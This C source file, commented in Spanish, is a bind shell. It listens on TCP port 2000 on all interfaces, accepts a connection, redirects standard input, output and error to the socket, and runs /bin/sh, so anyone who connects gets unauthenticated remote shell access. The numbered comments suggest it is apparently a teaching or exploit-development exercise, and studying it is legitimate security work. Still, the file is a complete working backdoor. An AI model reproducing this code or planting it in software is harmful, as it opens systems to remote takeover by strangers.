#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

void check_return(int, const char*);

int main() {
    struct sockaddr_in addr_server, addr_cli;
    unsigned short port = 2000;  /* Si el puerto < 1024 solo puede abrirlo root */
    unsigned int ip = INADDR_ANY;

    /* 1. Creación del socket */
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    check_return(sockfd, "ERROR: No se ha podido abrir el socket.\n");

    /* 2. Asociar una dirección al socket */
    addr_server.sin_family = AF_INET;
    addr_server.sin_addr.s_addr = htonl(ip);
    addr_server.sin_port = htons(port);
    check_return( bind(sockfd, (struct sockaddr*) &addr_server, sizeof(struct sockaddr_in)),
		  "ERROR: No se ha podido hacer el binding del socket.\n");

    /* 3. Atender conexiones (máximo 10 conexiones en la cola) */
    check_return( listen(sockfd, 10), 
		  "ERROR: No se ha ejecutado correctamente la función listen().\n");
    printf("El puerto %d se ha puesto a la escucha correctamente. Esperando conexión...\n", port);
    
    /* 4. Aceptar una conexión */
    int addr_cli_size = sizeof(struct sockaddr_in);
    int newSockfd = accept(sockfd, (struct sockaddr*) &addr_cli, &addr_cli_size);
    check_return( newSockfd, "ERROR: Ha surgido algún problema al acceptar la conexión\n.");
    
    /* 8. Cerrar el socket de escucha */
    check_return(close(sockfd), "ERROR: No se ha podido cerrar el socket.\n");
    
    printf("Conexión aceptada. Se está levantando la terminal...\n");
    
    /* Redirigir la entrada y las salida estandar al socket conectado */
    dup2(newSockfd, 0);
    dup2(newSockfd, 1);
    dup2(newSockfd, 2);
    
    /* Levantar la shell */
    char* name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    execve(name[0], name, NULL);
    
    /* Este código no debería ser ejecutado. Por lo menos, si lo hace, probaremos de
     * cerrar el socket correctamente */
    fprintf(stderr, "ERROR: No se ha podido levantar la terminal\n", NULL);
    check_return(close(newSockfd), "ERROR: No se ha podido cerrar el socket.\n");

    return -1;
}

void check_return(int num, const char* text) {
    if( num < 0 ) {
    	fprintf(stderr, text, NULL);
    	exit(-1);
    }
}